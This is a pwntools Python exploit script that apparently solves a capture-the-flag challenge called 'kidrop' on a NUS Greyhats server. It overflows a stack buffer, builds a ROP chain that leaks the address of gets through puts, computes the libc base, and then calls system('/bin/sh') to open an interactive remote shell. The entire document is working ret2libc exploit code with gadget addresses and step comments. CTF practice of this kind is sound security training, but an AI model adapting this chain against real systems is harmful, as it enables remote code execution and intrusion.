from pwn import *

SERVER = "challs1.nusgreyhats.org"
PORT = 5013

# p = process('./kidrop')
p = remote(SERVER, PORT)

elf = ELF('./kidrop')
libc = ELF('./libc.so.6')

# ROPgadget --binary kidrop | grep 'pop rdi'
# 0x0000000000401353 : pop rdi ; ret
POPRDI = 0x401353 # for first argument

# ROPgadget --binary kidrop | grep 'ret'
# 0x000000000040101a : ret
RET = 0x40101a

BUFFER = b'a' * (32+ 8)
# Address of gets in GOT
GETSGOT = elf.got.gets # 0x404038
# Address of puts function that GOT points to
PUTSPLT = elf.plt.puts
VULN = elf.sym.vuln

p.recvuntil(b'?')
p.recvline() # rid newline


# goal: call put(GETSGOT) to leak addr of GETS in GOT
payload = BUFFER
payload += p64(POPRDI) + p64(GETSGOT)
payload += p64(PUTSPLT)
payload += p64(VULN) # return back to vuln

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"leak: {hex(leak)}")

# gets offset in libc
GETSOFFSET = libc.sym.gets
libc_base_addr = leak - GETSOFFSET

# set libc_base_addr as libc base
libc.address = libc_base_addr

libc_system = libc.sym.system
libc_sh = next(libc.search(b'/bin/sh'))

# call system(bin/sh)
payload2 = BUFFER
payload2 += p64(RET)
payload2 += p64(POPRDI) + p64(libc_sh)
payload2 += p64(libc_system)

## Attach debugger
# gdb.attach(p)
# pause()

p.sendline(payload2)

p.interactive()
